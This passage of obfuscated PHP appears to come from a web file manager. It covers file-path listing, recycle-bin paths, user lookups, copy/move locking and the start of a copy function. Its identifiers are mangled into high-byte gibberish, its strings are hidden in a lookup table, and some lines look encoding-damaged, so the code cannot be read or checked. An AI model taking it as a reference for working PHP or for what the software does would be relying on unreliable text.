unset($ó¡·Ó™Ä[$öÙê­ğ]); continue; } $¢•»ãı† = $ùìêË€->listData($ú‰¼ˆ¾“[$Èó’±¥Ù[405]]); if (!$¢•»ãı†) { $©Î¦«¥ì->remove($í„†Õí[$Èó’±¥Ù[392]]); unset($ó¡·Ó™Ä[$öÙê­ğ]); continue; } $í„†Õí[$Èó’±¥Ù[405]] = $¢•»ãı†; $í„†Õí[$Èó’±¥Ù[502]] = $ú‰¼ˆ¾“; $í„†Õí[$Èó’±¥Ù[503]] = Model($Èó’±¥Ù[504])->getInfoSimpleOuter($í„†Õí[$Èó’±¥Ù[443]]); $ó¡·Ó™Ä[$öÙê­ğ] = $í„†Õí; } } $ Ä†¦Ö´ = defined($Èó’±¥Ù[505]) ? USER_ID : $Èó’±¥Ù[12]; $ì®œç®û = array(); $œà’îÎ = $this->_listAppendPath($ì®œç®û, !0); foreach ($¦¡¡Îª¾ as $öÙê­ğ => &$í„†Õí) { if (!is_array($í„†Õí[$Èó’±¥Ù[405]])) { continue; } if ($í„†Õí[$Èó’±¥Ù[403]] != $Èó’±¥Ù[506]) { continue; } if (isset($ó¡·Ó™Ä[$í„†Õí[$Èó’±¥Ù[394]]])) { $ú“ ®Ó½ = $ó¡·Ó™Ä[$í„†Õí[$Èó’±¥Ù[394]]]; if (!is_array($í„†Õí[$Èó’±¥Ù[456]])) { $í„†Õí[$Èó’±¥Ù[456]] = array(); } $í„†Õí[$Èó’±¥Ù[456]][$Èó’±¥Ù[507]] = $ú“ ®Ó½[$Èó’±¥Ù[501]]; $í„†Õí[$Èó’±¥Ù[405]][$Èó’±¥Ù[508]] = $ú“ ®Ó½; $í„†Õí[$Èó’±¥Ù[405]][$Èó’±¥Ù[509]] = $í„†Õí[$Èó’±¥Ù[510]]; $í„†Õí[$Èó’±¥Ù[405]][$Èó’±¥Ù[511]] = $Èó’±¥Ù[89]; if ($ú“ ®Ó½[$Èó’±¥Ù[443]] != $ Ä†¦Ö´) { $í„†Õí[$Èó’±¥Ù[405]][$Èó’±¥Ù[406]] = $í„†Õí[$Èó’±¥Ù[405]][$Èó’±¥Ù[406]] & $ú“ ®Ó½[$Èó’±¥Ù[405]][$Èó’±¥Ù[405]]; } continue; } $ıïÙ°»° = $this->parentLevelArray($í„†Õí[$Èó’±¥Ù[512]]); $–ÃÜ¤Á’ = array_reverse($ıïÙ°»°); foreach ($–ÃÜ¤Á’ as $ß³¾ÊŠÖ => $¡¯ù…ô‚) { if (!isset($ó¡·Ó™Ä[$¡¯ù…ô‚])) { continue; } $ú“ ®Ó½ = $ó¡·Ó™Ä[$¡¯ù…ô‚]; $í„†Õí[$Èó’±¥Ù[405]][$Èó’±¥Ù[508]] = $ú“ ®Ó½; if ($ú“ ®Ó½[$Èó’±¥Ù[443]] != $ Ä†¦Ö´) { $í„†Õí[$Èó’±¥Ù[405]][$Èó’±¥Ù[406]] = $í„†Õí[$Èó’±¥Ù[405]][$Èó’±¥Ù[406]] & $ú“ ®Ó½[$Èó’±¥Ù[405]][$Èó’±¥Ù[405]]; } $í´µşÖç = $Èó’±¥Ù[12]; $µŠ°¦Ú = count($ıïÙ°»°) - $ß³¾ÊŠÖ; for ($” ÉÄ’ù = 0; $” ÉÄ’ù < $µŠ°¦Ú; $” ÉÄ’ù++) { if (!isset($œà’îÎ[$ıïÙ°»°[$” ÉÄ’ù]])) { $í´µşÖç = $Èó’±¥Ù[12]; break; } $í´µşÖç = $í´µşÖç . rtrim($œà’îÎ[$ıïÙ°»°[$” ÉÄ’ù]], $Èó’±¥Ù[8]) . $Èó’±¥Ù[8]; } $í„†Õí[$Èó’±¥Ù[405]][$Èó’±¥Ù[509]] = rtrim($í´µşÖç, $Èó’±¥Ù[8]) . $Èó’±¥Ù[8]; break; } } unset($í„†Õí); } public function groupPathDisplay(&$ÁÁî¼) { $ÜöÍ¢ğñ =& $_SERVER[® ¨Ä®ñ]; if ($ÁÁî¼[$ÜöÍ¢ğñ[403]] != self::TYPE_GROUP) { return; } $ãşòŸ = Model($ÜöÍ¢ğñ[513])->getInfo($ÁÁî¼[$ÜöÍ¢ğñ[495]]); $Î“‡œÈ™ = $this->parentLevelArray($ãşòŸ[$ÜöÍ¢ğñ[512]]); $£ÛÏ‰ÃÔ = $ÜöÍ¢ğñ[12]; foreach ($Î“‡œÈ™ as $¸ØÈô•ù) { $î´Ò—Ú = Model($ÜöÍ¢ğñ[513])->getInfo($¸ØÈô•ù); $£ÛÏ‰ÃÔ .= $î´Ò—Ú[$ÜöÍ¢ğñ[87]][$ÜöÍ¢ğñ[394]] . $ÜöÍ¢ğñ[50]; } $ÁÁî¼[$ÜöÍ¢ğñ[514]] = $ãşòŸ[$ÜöÍ¢ğñ[489]]; $ÁÁî¼[$ÜöÍ¢ğñ[515]] = $ãşòŸ[$ÜöÍ¢ğñ[512]]; $ÁÁî¼[$ÜöÍ¢ğñ[516]] = $ãşòŸ[$ÜöÍ¢ğñ[517]]; $ÁÁî¼[$ÜöÍ¢ğñ[518]] = $£ÛÏ‰ÃÔ . $ãşòŸ[$ÜöÍ¢ğñ[87]][$ÜöÍ¢ğñ[394]]; } protected function _listAppendPath(&$×ÛƒĞÆ‰, $şîÍëß‡ = false) { $¥Ğ¦ò˜® =& $_SERVER[® ¨Ä®ñ]; static $¹ˆµ€å = array(); $êÎ´Å¿³ = array(); $Úß¶ğß = array(); if ($şîÍëß‡) { return $¹ˆµ€å; } foreach ($×ÛƒĞÆ‰ as &$ úËÊ) { $Š€ì¯÷ã = $ úËÊ[$¥Ğ¦ò˜®[394]]; if ($ úËÊ[$¥Ğ¦ò˜®[402]] == $¥Ğ¦ò˜®[89] && $ úËÊ[$¥Ğ¦ò˜®[489]] != 0) { $¹ˆµ€å[$Š€ì¯÷ã] = $ úËÊ[$¥Ğ¦ò˜®[32]]; } if ($ úËÊ[$¥Ğ¦ò˜®[402]] == $¥Ğ¦ò˜®[89] && $ úËÊ[$¥Ğ¦ò˜®[489]] == 0 && !isset($¹ˆµ€å[$Š€ì¯÷ã])) { $¹ˆµ€å[$Š€ì¯÷ã] = $this->_listAppendPathRoot($ úËÊ, array()); } if (isset($Úß¶ğß[$ úËÊ[$¥Ğ¦ò˜®[512]]])) { continue; } $Úß¶ğß[$ úËÊ[$¥Ğ¦ò˜®[512]]] = !0; $£ÅâÇ¾è = $this->parentLevelArray($ úËÊ[$¥Ğ¦ò˜®[512]]); foreach ($£ÅâÇ¾è as $è¶àùÊ“ => $ĞÛ¬¦Èã) { if (isset($¹ˆµ€å[$ĞÛ¬¦Èã])) { continue; } if ($è¶àùÊ“ == 0) { $¹ˆµ€å[$ĞÛ¬¦Èã] = $this->_listAppendPathRoot($ úËÊ, $£ÅâÇ¾è); } if ($è¶àùÊ“ != 0) { $êÎ´Å¿³[] = $ĞÛ¬¦Èã; } } } unset($ úËÊ); $êÎ´Å¿³ = array_unique($êÎ´Å¿³); if (count($êÎ´Å¿³) > 0) { $´ùŸÒÔĞ = array($¥Ğ¦ò˜®[409] => array($¥Ğ¦ò˜®[410], $êÎ´Å¿³)); if (count($êÎ´Å¿³) == 1) { $ î‰œ¦ö = $this->sourceInfo($êÎ´Å¿³[0]); $…é¥…¢Œ = is_array($ î‰œ¦ö) ? array($ î‰œ¦ö) : !1; } else { $…é¥…¢Œ = $this->field($¥Ğ¦ò˜®[519])->where($´ùŸÒÔĞ)->select(); } if (!$…é¥…¢Œ) { $…é¥…¢Œ = array(); } foreach ($…é¥…¢Œ as $®’ÙÀ…¡) { $¹ˆµ€å[$®’ÙÀ…¡[$¥Ğ¦ò˜®[394]]] = $®’ÙÀ…¡[$¥Ğ¦ò˜®[32]]; } } $áñÌ½ÔÕ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $œè­½‘ = array(); foreach ($×ÛƒĞÆ‰ as &$ úËÊ) { $•²°à¡„ = $ úËÊ[$¥Ğ¦ò˜®[512]]; $Ó®ôÛ¿· = $¥Ğ¦ò˜®[12]; if (isset($œè­½‘[$•²°à¡„])) { $Ó®ôÛ¿· = $œè­½‘[$•²°à¡„]; } else { $£ÅâÇ¾è = $this->parentLevelArray($ úËÊ[$¥Ğ¦ò˜®[512]]); foreach ($£ÅâÇ¾è as $è¶àùÊ“ => $ĞÛ¬¦Èã) { if (isset($¹ˆµ€å[$ĞÛ¬¦Èã])) { $Ó®ôÛ¿· .= $¹ˆµ€å[$ĞÛ¬¦Èã] . $¥Ğ¦ò˜®[8]; } } $œè­½‘[$•²°à¡„] = $Ó®ôÛ¿·; } $Ó®ôÛ¿· .= $ úËÊ[$¥Ğ¦ò˜®[32]]; if ($ úËÊ[$¥Ğ¦ò˜®[402]] == $¥Ğ¦ò˜®[89]) { $Ó®ôÛ¿· .= $¥Ğ¦ò˜®[8]; } $ úËÊ[$¥Ğ¦ò˜®[510]] = str_replace($¥Ğ¦ò˜®[520], $¥Ğ¦ò˜®[8], $Ó®ôÛ¿·); if ($ úËÊ[$¥Ğ¦ò˜®[489]] == $¥Ğ¦ò˜®[190]) { $ úËÊ[$¥Ğ¦ò˜®[32]] = trim($¹ˆµ€å[$ úËÊ[$¥Ğ¦ò˜®[394]]], $¥Ğ¦ò˜®[8]); $ úËÊ[$¥Ğ¦ò˜®[510]] = $ úËÊ[$¥Ğ¦ò˜®[32]] . $¥Ğ¦ò˜®[8]; } if (intval($ úËÊ[$¥Ğ¦ò˜®[403]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ úËÊ, $£ÅâÇ¾è, $áñÌ½ÔÕ); } } unset($ úËÊ); return $×ÛƒĞÆ‰; } private function _listAppendPathRecycle(&$ïùÖôëÌ, $ÌÒş·ı·, $î’»²») { $Æ¥í¦ÚÚ =& $_SERVER[® ¨Ä®ñ]; if (!in_array($î’»²», $ÌÒş·ı·) && $ïùÖôëÌ[$Æ¥í¦ÚÚ[394]] != $î’»²») { return; } $µĞ›˜Ñ = explode($Æ¥í¦ÚÚ[8], trim($ïùÖôëÌ[$Æ¥í¦ÚÚ[510]], $Æ¥í¦ÚÚ[8])); $çÌ„ŠÍÖ = implode($Æ¥í¦ÚÚ[8], array_slice($µĞ›˜Ñ, 2)); $ïùÖôëÌ[$Æ¥í¦ÚÚ[510]] = $Æ¥í¦ÚÚ[8] . LNG($Æ¥í¦ÚÚ[521]) . $Æ¥í¦ÚÚ[8] . ltrim($çÌ„ŠÍÖ, $Æ¥í¦ÚÚ[8]); $ïùÖôëÌ[$Æ¥í¦ÚÚ[512]] = $Æ¥í¦ÚÚ[522] . implode($Æ¥í¦ÚÚ[50], array_slice($ÌÒş·ı·, 1)) . $Æ¥í¦ÚÚ[50]; if ($ïùÖôëÌ[$Æ¥í¦ÚÚ[394]] == $î’»²») { $ïùÖôëÌ[$Æ¥í¦ÚÚ[512]] = $Æ¥í¦ÚÚ[522]; $ïùÖôëÌ[$Æ¥í¦ÚÚ[489]] = $Æ¥í¦ÚÚ[190]; $ïùÖôëÌ[$Æ¥í¦ÚÚ[32]] = LNG($Æ¥í¦ÚÚ[521]); } $ïùÖôëÌ[$Æ¥í¦ÚÚ[523]] = $Æ¥í¦ÚÚ[524]; } protected function _listAppendPathRoot(&$ŠÀ â¡, $éÇÆ›û¼) { $ŠĞâí‘ =& $_SERVER[® ¨Ä®ñ]; $¤öı³ = $ŠĞâí‘[12]; if ($ŠÀ â¡[$ŠĞâí‘[403]] == self::TYPE_USER) { if (defined($ŠĞâí‘[465]) && $ŠÀ â¡[$ŠĞâí‘[495]] == USER_ID) { $¤öı³ = LNG($ŠĞâí‘[525]); if (!$éÇÆ›û¼) { $ŠÀ â¡[$ŠĞâí‘[32]] = $¤öı³; } } else { $­å½àşõ = Model($ŠĞâí‘[504])->getInfoSimple($ŠÀ â¡[$ŠĞâí‘[495]]); $¤öı³ = LNG($ŠĞâí‘[526]) . $ŠĞâí‘[159] . $­å½àşõ[$ŠĞâí‘[32]] . $ŠĞâí‘[527]; } } else { if ($ŠÀ â¡[$ŠĞâí‘[403]] == self::TYPE_GROUP) { $­å½àşõ = Model($ŠĞâí‘[513])->getInfoSimple($ŠÀ â¡[$ŠĞâí‘[495]]); $¤öı³ = $­å½àşõ[$ŠĞâí‘[32]]; } else { if ($ŠÀ â¡[$ŠĞâí‘[403]] == self::TYPE_SYSTEM) { $¤öı³ = $ŠĞâí‘[528]; } } } $¤öı³ = $¤öı³ ? $ŠĞâí‘[8] . $¤öı³ . $ŠĞâí‘[8] : $ŠĞâí‘[8]; return $¤öı³; } protected function _listAppendUser(&$åä¦˜ö¾) { $‹Ÿ‚ƒÙ¸ =& $_SERVER[® ¨Ä®ñ]; $ğªÌŸ¬› = array_to_keyvalue($åä¦˜ö¾, $‹Ÿ‚ƒÙ¸[12], $‹Ÿ‚ƒÙ¸[443]); $åßòêèÛ = array_to_keyvalue($åä¦˜ö¾, $‹Ÿ‚ƒÙ¸[12], $‹Ÿ‚ƒÙ¸[445]); $¹óŠ»œ  = array_merge($ğªÌŸ¬›, $åßòêèÛ); $¬õ÷•¢½ = Model($‹Ÿ‚ƒÙ¸[529])->userListInfo($¹óŠ»œ ); foreach ($åä¦˜ö¾ as &$£›³Âë˜) { $Ï¯¥É‚‡ = $£›³Âë˜[$‹Ÿ‚ƒÙ¸[443]]; $£›³Âë˜[$‹Ÿ‚ƒÙ¸[443]] = $¬õ÷•¢½[$Ï¯¥É‚‡] ? $¬õ÷•¢½[$Ï¯¥É‚‡] : !1; $Ï¯¥É‚‡ = $£›³Âë˜[$‹Ÿ‚ƒÙ¸[445]]; $£›³Âë˜[$‹Ÿ‚ƒÙ¸[445]] = $¬õ÷•¢½[$Ï¯¥É‚‡] ? $¬õ÷•¢½[$Ï¯¥É‚‡] : !1; if (isset($£›³Âë˜[$‹Ÿ‚ƒÙ¸[456]]) && $£›³Âë˜[$‹Ÿ‚ƒÙ¸[456]][$‹Ÿ‚ƒÙ¸[530]]) { $À÷ŠŸ®Š = $GLOBALS[$‹Ÿ‚ƒÙ¸[6]][$‹Ÿ‚ƒÙ¸[90]][$‹Ÿ‚ƒÙ¸[531]]; if ($£›³Âë˜[$‹Ÿ‚ƒÙ¸[456]][$‹Ÿ‚ƒÙ¸[532]] <= time() - $À÷ŠŸ®Š) { $this->metaSet($£›³Âë˜[$‹Ÿ‚ƒÙ¸[394]], $‹Ÿ‚ƒÙ¸[530], null); $this->metaSet($£›³Âë˜[$‹Ÿ‚ƒÙ¸[394]], $‹Ÿ‚ƒÙ¸[532], null); unset($£›³Âë˜[$‹Ÿ‚ƒÙ¸[456]][$‹Ÿ‚ƒÙ¸[530]]); continue; } $ê©–Öã™ = $£›³Âë˜[$‹Ÿ‚ƒÙ¸[456]][$‹Ÿ‚ƒÙ¸[530]]; $£›³Âë˜[$‹Ÿ‚ƒÙ¸[456]][$‹Ÿ‚ƒÙ¸[533]] = Model($‹Ÿ‚ƒÙ¸[529])->getInfoSimpleOuter($ê©–Öã™); } } unset($£›³Âë˜); } public function parentLevelArray($—ç¦™„Ä) { $Î…èÁÉá =& $_SERVER[® ¨Ä®ñ]; $—ç¦™„Ä = explode($Î…èÁÉá[50], trim($—ç¦™„Ä, $Î…èÁÉá[50])); return array_remove_value($—ç¦™„Ä, $Î…èÁÉá[190]); } public function listAll($ñİİïÙ²) { $óÍ½êÓ =& $_SERVER[® ¨Ä®ñ]; $æí“Œ˜Ş = $this->sourceInfo($ñİİïÙ²); $èˆƒ’Ğà = array($óÍ½êÓ[534] => array($óÍ½êÓ[535], $æí“Œ˜Ş[$óÍ½êÓ[512]] . $ñİİïÙ² . $óÍ½êÓ[536]), $óÍ½êÓ[537] => 0); $¤Ğ ”Éş = $óÍ½êÓ[538]; $ĞÔÌ§ƒ¶ = "\x4c\x45\x46\124\x20\112\117\111\116\40{$this->tablePrefix}\151\x6f\x5f\146\151\x6c\x65\x20\x66\x69\154\145\x20\157\x6e\x20\x73\x6f\x75\162\x63\x65\x2e\x66\151\x6c\145\x49\x44\x20\75\40\146\151\154\x65\56\146\151\x6c\145\111\104"; $Öº‹ûÍ = $this->alias($óÍ½êÓ[435])->field($¤Ğ ”Éş)->where($èˆƒ’Ğà)->join($ĞÔÌ§ƒ¶)->select(); $this->_listAppendAuth($Öº‹ûÍ); $this->_listAppendUser($Öº‹ûÍ); $this->_listAppendPath($Öº‹ûÍ); $Öº‹ûÍ = array_to_keyvalue($Öº‹ûÍ, $óÍ½êÓ[394]); $¦öùæ² = "\x2f{$æí“Œ˜Ş[$óÍ½êÓ[32]]}\x2f"; $¦öùæ² = $¦öùæ² == $óÍ½êÓ[520] ? $óÍ½êÓ[8] : $¦öùæ²; $ä™ñÉıÉ = array(); foreach ($Öº‹ûÍ as $ùÔ•«Æ => $ñªÂÉ‚„) { $“ÑØÉê„ = $this->parentLevelArray($ñªÂÉ‚„[$óÍ½êÓ[512]]); array_shift($“ÑØÉê„); $›Ä‹ìÏü = $¦öùæ²; for ($Ç¾ˆÈ™ = 0; $Ç¾ˆÈ™ < count($“ÑØÉê„); $Ç¾ˆÈ™++) { $›Ä‹ìÏü .= $Öº‹ûÍ[$“ÑØÉê„[$Ç¾ˆÈ™]][$óÍ½êÓ[32]] . $óÍ½êÓ[8]; } $›Ä‹ìÏü .= $ñªÂÉ‚„[$óÍ½êÓ[32]]; if ($ñªÂÉ‚„[$óÍ½êÓ[402]]) { $›Ä‹ìÏü .= $óÍ½êÓ[8]; } $›Ä‹ìÏü = str_replace($óÍ½êÓ[520], $óÍ½êÓ[8], $›Ä‹ìÏü); $›Ä‹ìÏü = str_replace($óÍ½êÓ[520], $óÍ½êÓ[8], $›Ä‹ìÏü); $ ÕˆÈğ = array($óÍ½êÓ[413] => str_replace($óÍ½êÓ[520], $óÍ½êÓ[8], $›Ä‹ìÏü), $óÍ½êÓ[539] => intval($ñªÂÉ‚„[$óÍ½êÓ[402]]), $óÍ½êÓ[87] => $this->pathInfoFilter($ñªÂÉ‚„)); if (!$ñªÂÉ‚„[$óÍ½êÓ[402]]) { $ ÕˆÈğ[$óÍ½êÓ[458]] = $ñªÂÉ‚„[$óÍ½êÓ[458]]; $ ÕˆÈğ[$óÍ½êÓ[88]] = $ñªÂÉ‚„[$óÍ½êÓ[78]]; } $ä™ñÉıÉ[] = $ ÕˆÈğ; } return $ä™ñÉıÉ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Æé®Î) { $´Ğ‡É¿‚ =& $_SERVER[® ¨Ä®ñ]; if (!$this->allowLock()) { return; } $this->_lockCheck($´Ğ‡É¿‚[540], $Æé®Î); $¨Ù®‹Ï = 1; $this->_lockEvent($Æé®Î, array($´Ğ‡É¿‚[541], $´Ğ‡É¿‚[542]), $¨Ù®‹Ï); $this->_lockParent($Æé®Î, array($´Ğ‡É¿‚[542]), $¨Ù®‹Ï); $this->_lockEvent($Æé®Î, array($´Ğ‡É¿‚[543], $´Ğ‡É¿‚[544]), $¨Ù®‹Ï); $this->_lockCheckEnd($´Ğ‡É¿‚[540], $Æé®Î); } public function lockCopyEnd($Ú‚È‰Â) { $ú¹ôğˆú =& $_SERVER[® ¨Ä®ñ]; if (!$this->allowLock()) { return; } $…ãº‹—É = 0; $this->_lockEvent($Ú‚È‰Â, array($ú¹ôğˆú[541], $ú¹ôğˆú[542]), $…ãº‹—É); $this->_lockParent($Ú‚È‰Â, array($ú¹ôğˆú[542]), $…ãº‹—É); $this->_lockEvent($Ú‚È‰Â, array($ú¹ôğˆú[543], $ú¹ôğˆú[544]), $…ãº‹—É); } public function lockWriteStart($£ù¹²ûñ, $•±¾ô—­ = '') { $¶Ø™É” =& $_SERVER[® ¨Ä®ñ]; if (!$this->allowLock()) { return; } $this->_lockCheck($¶Ø™É”[541], $£ù¹²ûñ); $“ŞÕˆ¨¨ = 1; $this->_lockKey($¶Ø™É”[545] . $£ù¹²ûñ . $¶Ø™É”[10] . $•±¾ô—­, $“ŞÕˆ¨¨); $this->_lockEvent($£ù¹²ûñ, array($¶Ø™É”[540], $¶Ø™É”[542]), $“ŞÕˆ¨¨); $this->_lockParent($£ù¹²ûñ, array($¶Ø™É”[540], $¶Ø™É”[542]), $“ŞÕˆ¨¨); $this->_lockCheckEnd($¶Ø™É”[541], $£ù¹²ûñ); } public function lockWriteEnd($è–İ›Óº, $‡ñ•Øèİ = '') { $™ı¼è˜¹ =& $_SERVER[® ¨Ä®ñ]; if (!$this->allowLock()) { return; } $âşâ¢î˜ = 0; $this->_lockKey($™ı¼è˜¹[545] . $è–İ›Óº . $™ı¼è˜¹[10] . $‡ñ•Øèİ, $âşâ¢î˜); $this->_lockEvent($è–İ›Óº, array($™ı¼è˜¹[540], $™ı¼è˜¹[542]), $âşâ¢î˜); $this->_lockParent($è–İ›Óº, array($™ı¼è˜¹[540], $™ı¼è˜¹[542]), $âşâ¢î˜); } public function lockMoveStart($ï­¥ãŒ¸) { $ˆ—áˆ®À =& $_SERVER[® ¨Ä®ñ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ˆ—áˆ®À[542], $ï­¥ãŒ¸); $Ô“¶õ·Í = 1; $this->_lockKey($ˆ—áˆ®À[546] . $ï­¥ãŒ¸, $Ô“¶õ·Í); $this->_lockEvent($ï­¥ãŒ¸, array($ˆ—áˆ®À[540], $ˆ—áˆ®À[541]), $Ô“¶õ·Í); $this->_lockParent($ï­¥ãŒ¸, array($ˆ—áˆ®À[540], $ˆ—áˆ®À[542]), $Ô“¶õ·Í); $this->_lockEvent($ï­¥ãŒ¸, array($ˆ—áˆ®À[547], $ˆ—áˆ®À[543], $ˆ—áˆ®À[544]), $Ô“¶õ·Í); $this->_lockCheckEnd($ˆ—áˆ®À[542], $ï­¥ãŒ¸); } public function lockMoveEnd($ÚË±“Î) { $¢ò‡ùö° =& $_SERVER[® ¨Ä®ñ]; if (!$this->allowLock()) { return; } $€¹×·ä‘ = 0; $this->_lockKey($¢ò‡ùö°[546] . $ÚË±“Î, $€¹×·ä‘); $this->_lockEvent($ÚË±“Î, array($¢ò‡ùö°[540], $¢ò‡ùö°[541]), $€¹×·ä‘); $this->_lockParent($ÚË±“Î, array($¢ò‡ùö°[540], $¢ò‡ùö°[542]), $€¹×·ä‘); $this->_lockEvent($ÚË±“Î, array($¢ò‡ùö°[547], $¢ò‡ùö°[543], $¢ò‡ùö°[544]), $€¹×·ä‘); } private function _lockCheck($¯ğ»Ìİ•, $µ³õ¶àš) { $¨¡Ö²†ˆ =& $_SERVER[® ¨Ä®ñ]; $ï·ƒ×ôó = $this->sourceInfo($µ³õ¶àš); $Œ‘À¡ì‘ = $¯ğ»Ìİ• . $¨¡Ö²†ˆ[10] . $µ³õ¶àš; $this->_lockTimeStart[$Œ‘À¡ì‘] = timeFloat(); if (!is_array($ï·ƒ×ôó)) { return; } $’¤ûŞê = LNG($¨¡Ö²†ˆ[548]); CacheLock::setErrorMsg($¨¡Ö²†ˆ[159] . htmlspecialchars($ï·ƒ×ôó[$¨¡Ö²†ˆ[32]]) . $¨¡Ö²†ˆ[527] . $’¤ûŞê); $this->_lockKey($Œ‘À¡ì‘, 1); $this->_lockKey($Œ‘À¡ì‘, 0); $«„¬¦”• = array_reverse($this->parentLevelArray($ï·ƒ×ôó[$¨¡Ö²†ˆ[512]])); foreach ($«„¬¦”• as $ÚÏ €æÚ) { $Œ‘À¡ì‘ = $¯ğ»Ìİ• . $¨¡Ö²†ˆ[549] . $ÚÏ €æÚ; if (CacheLock::lockGet($¨¡Ö²†ˆ[550] . $Œ‘À¡ì‘)) { $ï·ƒ×ôó = $this->sourceInfo($ÚÏ €æÚ); CacheLock::setErrorMsg($¨¡Ö²†ˆ[159] . htmlspecialchars($ï·ƒ×ôó[$¨¡Ö²†ˆ[32]]) . $¨¡Ö²†ˆ[527] . $’¤ûŞê); $this->_lockKey($Œ‘À¡ì‘, 1); $this->_lockKey($Œ‘À¡ì‘, 0); } } } private function _lockCheckEnd($ßú½ËŒÏ, $ª™šÄ”Ì) { $à’ı =& $_SERVER[® ¨Ä®ñ]; $®ì²¬ò¶ = $ßú½ËŒÏ . $à’ı[10] . $ª™šÄ”Ì; CacheLock::setErrorMsg($à’ı[373]); if (!isset($this->_lockTimeStart[$®ì²¬ò¶])) { return; } $¯şİ¬üû = timeFloat() - $this->_lockTimeStart[$®ì²¬ò¶]; unset($this->_lockTimeStart[$®ì²¬ò¶]); if ($¯şİ¬üû > 0.5) { unset(self::$cacheSourceInfo[$à’ı[449] . $ª™šÄ”Ì]); } $Ë™ó‡¿ = $this->sourceInfo($ª™šÄ”Ì); if (!$Ë™ó‡¿) { show_json(LNG($à’ı[106]), !1); } } private function _lockParent($ñµ„”ÚÑ, $ïí‹´½, $Â¥Óê¢­) { if (!$this->autoLockSet) { return; } $Îá¸ê•… = $this->sourceInfo($ñµ„”ÚÑ); if (!is_array($Îá¸ê•…)) { return; } $àŸ†ª¹² = array_reverse($this->parentLevelArray($Îá¸ê•…[$_SERVER[® ¨Ä®ñ][512]])); foreach ($àŸ†ª¹² as $²ì¡‘šÕ) { $this->_lockEvent($²ì¡‘šÕ, $ïí‹´½, $Â¥Óê¢­); } } private function _lockEvent($—”¦®ğŒ, $¶­ÄéŸú, $è•¼È›ó) { $šÍúõÀ =& $_SERVER[® ¨Ä®ñ]; if (!$this->autoLockSet) { return; } foreach ($¶­ÄéŸú as $ğâÒùŠµ) { $†ç›Èéœ = $ğâÒùŠµ . $šÍúõÀ[10] . $—”¦®ğŒ; if ($è•¼È›ó && CacheLock::lockGet($šÍúõÀ[550] . $†ç›Èéœ)) { continue; } $this->_lockKey($†ç›Èéœ, $è•¼È›ó); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($½Å¢Œá, $§ôäüöø = 1) { $ìå¤³Ó = $_SERVER[® ¨Ä®ñ][550] . md5($½Å¢Œá); if ($§ôäüöø) { if (isset(self::$_lockItemArr[$ìå¤³Ó])) { return; } self::$_lockItemArr[$ìå¤³Ó] = 1; CacheLock::lock($ìå¤³Ó, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ìå¤³Ó])) { return; } unset(self::$_lockItemArr[$ìå¤³Ó]); CacheLock::unlock($ìå¤³Ó); } } public function isParentOf($îœÜÎ©Œ, $±ıœÁŠÀ) { $äÔùÕ— =& $_SERVER[® ¨Ä®ñ]; $èÏ¸½ëÓ = $this->sourceInfo($îœÜÎ©Œ); $¤šÌ³Õ = $this->sourceInfo($±ıœÁŠÀ); $¢´‰Ã°º = $èÏ¸½ëÓ[$äÔùÕ—[512]] . $èÏ¸½ëÓ[$äÔùÕ—[394]] . $äÔùÕ—[50]; $•ª´­ÜÅ = $¤šÌ³Õ[$äÔùÕ—[512]] . $¤šÌ³Õ[$äÔùÕ—[394]] . $äÔùÕ—[50]; $”ÙÅıöÍ = strpos($•ª´­ÜÅ, $¢´‰Ã°º) === 0; return $”ÙÅıöÍ; } private $targetIsDelete = 0; public function copy($Ôåôãƒ, $ó¦‹µª³, $í‰÷äÛ = REPEAT_REPLACE, $äí ì = '') { $Á¨‹‰Ç™ =& $_SERVER[® ¨Ä®ñ]; $“èêìù¼ = $this->sourceInfo($Ôåôãƒ); $‚ïÍíÄã = $this->sourceInfo($ó¦‹µª³); if (!$“èêìù¼ || !$‚ïÍíÄã || $‚ïÍíÄã[$Á¨‹‰Ç™[402]] != $Á¨‹‰Ç™[89]) { return !1; } if ($this->isParentOf($Ôåôãƒ, $ó¦‹µª³)) { return !1; } $º†›ÙÈ– = $äí ì ? $äí ì : $“èêìù¼[$Á¨‹‰Ç™[32]]; $this->lockCopyStart($Ôåôãƒ); $this->lockWriteStart($ó¦‹µª³, $º†›ÙÈ–); $ËæÊ™¹ª = array($Á¨‹‰Ç™[551] => array(), $Á¨‹‰Ç™[552] => array(), $Á¨‹‰Ç™[553] => array()); $this->targetIsDelete = intval($“èêìù¼[$Á¨‹‰Ç™[422]]); $¸Ïïµñæ = $this->fileNameExistCache($ó¦‹µª³, $“èêìù¼[$Á¨‹‰Ç™[32]]); $·€„ÍÅ = $this->_copy($Ôåôãƒ, $ó¦‹µª³, $í‰÷äÛ, $ËæÊ™¹ª, !0, $äí ì); $this->_childrenListClear(); $this->lockCopyEnd($Ôåôãƒ); $this->lockWriteEnd($ó¦‹µª³, $º†›ÙÈ–); if ($“èêìù¼[$Á¨‹‰Ç™[402]] == $Á¨‹‰Ç™[89] && $¸Ïïµñæ == $·€„ÍÅ) { $this->folderSizeResetChildren($¸Ïïµñæ); } Model($Á¨‹‰Ç™[554])->addAll($ËæÊ™¹ª[$Á¨‹‰Ç™[552]], array(), !0); if ($¸Ïïµñæ != $·€„ÍÅ || $“èêìù¼[$Á¨‹‰Ç™[402]] == $Á¨‹‰Ç™[89]) { Model($Á¨‹‰Ç™[555])->eventCopy($·€„ÍÅ); } $this->saveAll($ËæÊ™¹ª[$Á¨‹‰Ç™[553]]); Model($Á¨‹‰Ç™[192])->linkAdd($ËæÊ™¹ª[$Á¨‹‰Ç™[551]]); $this->folderSizeReset($ó¦‹µª³); $this->updateModifyTime($ó¦‹µª³); return $·€„ÍÅ; } private function _copy($ÍĞã€Ù, $‚š¦ßè«, $ÂÎ’Çêñ, &$•âÓ®„Ì, $«ô¥á¢é, $¶¤åŒ©ì = '') { $É£ÀˆÜñ =& $_SERVER[® ¨Ä®ñ]; $Î‹ÇíîÛ = $this->sourceInfoCache($ÍĞã€Ù); $±É… â = $Î‹ÇíîÛ[$É£ÀˆÜñ[402]] == $É£ÀˆÜñ[89]; $şŞé˜·ë = $¶¤åŒ©ì ? $¶¤åŒ©ì : $Î‹ÇíîÛ[$É£ÀˆÜñ[32]]; 